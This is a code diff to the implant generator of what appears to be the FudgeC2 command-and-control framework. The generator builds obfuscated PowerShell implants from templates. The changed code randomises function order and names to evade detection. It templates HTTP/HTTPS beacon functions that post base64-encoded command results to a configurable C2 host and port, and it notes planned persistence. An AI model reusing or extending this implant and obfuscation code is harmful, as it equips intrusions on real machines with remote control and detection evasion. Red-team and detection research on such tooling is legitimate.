@@ -11,14 +11,18 @@ class ImplantGenerator:
     JinjaRandomisedArgs = {"rnd_function": "aaaaaa",
                            "obf_remote_play_audio": "RemotePlayAudio",
                            "obf_sleep": "sleep",
-                           "obf_collect_sysinfo":"collect_sysinfo"
+                           "obf_collect_sysinfo": "collect_sysinfo",
+                           "obf_http_conn": "http-connection",
+                           "obf_https_conn": "https-connection",
+                           "obf_dns_conn": "dns-connection"
                            }
 
     play_audio = '''
 function {{ ron.obf_remote_play_audio }} {
     $args[0]
 }
-            '''
+'''
+# -- TODO: Create implant persistence.
     fde_func_a = '''
 function aaaaaa() {}
     '''
@@ -46,7 +50,7 @@ function {{ ron.obf_collect_sysinfo }} ($a) {
 function {{ ron.rnd_function }} () {}
         '''
     http_function = '''
-function http-connection(){
+function {{ ron.obf_http_conn }}(){
     $Body =  @{username='me';moredata='qwerty'}
     $headers = @{}
     $headers.Add("X-Implant","{{ uii }}")
@@ -63,9 +67,9 @@ function http-connection(){
     '''
 
     https_function = '''
-function https-connection(){
+function {{ ron.obf_https_conn }}(){
     try {
-        $URL = "https://"+$sgep+":8080/index"
+        $URL = "https://"+$sgep+":{{ https_port }}/index"
         $kk = [System.Net.WebRequest]::Create($URL);
         $kk.Method = "POST"
         $kk.Headers.Add("X-Implant","{{ uii }}")
@@ -109,7 +113,7 @@ while($true){
         $headers = @{}
         $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
         $headers.Add("X-Result",$b64tr)
-        $LoginResponse = Invoke-WebRequest 'http://{{ url }}:{{ port }}/help' -Headers $headers -Body $Body -Method 'POST'
+        $LoginResponse = Invoke-WebRequest 'http://{{ url }}:{{ http_port }}/help' -Headers $headers -Body $Body -Method 'POST'
     }
 }
     '''
@@ -117,7 +121,6 @@ while($true){
     def _manage_implant_function_order(self, implant_info, function_list):
         # -- This is responsible for randomising the function order within the generated implant.
         if implant_info['obfuscation_level'] >= 1:
-            print("Shuffling functions")
             random.shuffle(function_list)
         constructed_base_implant = ""
         for implant_function in function_list:
@@ -126,17 +129,15 @@ while($true){
         return constructed_base_implant
 
     def _function_name_obfuscation(self, implant_info, function_names):
-        print(implant_info['obfuscation_level'])
         if implant_info['obfuscation_level'] >= 2:
             for key in function_names.keys():
                 letters = string.ascii_lowercase
                 temp_string = ''.join(random.choice(letters) for i in range(8))
                 if temp_string not in function_names.values():
                     function_names[key] = temp_string
-        print(function_names)
         return function_names
 
-    def __process_modules(self, id):
+    def _process_modules(self, implant_data, randomised_function_names):
         # --  New in Dwarven Blacksmith
         # Add default functions to added to the implant which will be randomised.
         implant_functions = [self.play_audio,
@@ -144,11 +145,11 @@ while($true){
                              self.update_implant,
                              self.fde_func_a,
                              self.fde_func_b]
+
         # Checks which protocols should be embedded into the implant.
-        print(id)
-        if id['comms_http'] is not None:
+        if implant_data['comms_http'] is not None:
             implant_functions.append(self.http_function)
-        if id['comms_https'] is not None:
+        if implant_data['comms_https'] is not None:
             implant_functions.append(self.https_function)
         # TODO: These protocols will be delivered in later iterations of FudgeC2
         # if id['comms_dns'] != None:
@@ -156,26 +157,29 @@ while($true){
         # if id['comms_binary'] != None:
         #     implant_functions.append(self.https_function)
 
-        constructed_implant = self._manage_implant_function_order(id, implant_functions)
-        string = ""
+        constructed_implant = self._manage_implant_function_order(implant_data, implant_functions)
+
+        # Generates the blob of code which will be used to determine which protocol should be selected from.
+        protocol_string = ""
         proto_count = 0
-        proto_list = {'comms_http': 'http-connection',
-                      'comms_https': 'https-connection',
-                      'comms_dns': 'dns-connection'}
+        proto_list = {'comms_http': randomised_function_names['obf_http_conn'],
+                      'comms_https': randomised_function_names['obf_https_conn'],
+                      'comms_dns': randomised_function_names['obf_dns_conn']}
 
         for x in proto_list.keys():
-            if id[x] is not 0:
-                string = string + "    " + str(proto_count) + " { $headers = " + proto_list[x] + " }\n"
+            if implant_data[x] is not 0:
+                protocol_string = protocol_string + "    " + str(proto_count) + " { $headers = " + proto_list[x] + " }\n"
                 proto_count += 1
 
-        f_str = 'switch ( get-random('+str(proto_count)+') ){ \n'+string+'     }'
+        f_str = 'switch ( get-random('+str(proto_count)+') ){ \n'+protocol_string+'     }'
         return constructed_implant, f_str
 
     def generate_implant_from_template(self, implant_data):
         # --  New in Tauren Herbalist
-        implant_template, protocol_switch = self.__process_modules(implant_data)
-
         implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
+
+        implant_template, protocol_switch = self._process_modules(implant_data, implant_function_names)
+        print(protocol_switch)
         cc = jinja2.Template(implant_template)
         output_from_parsed_template = cc.render(
             initial_sleep=implant_data['initial_delay'],
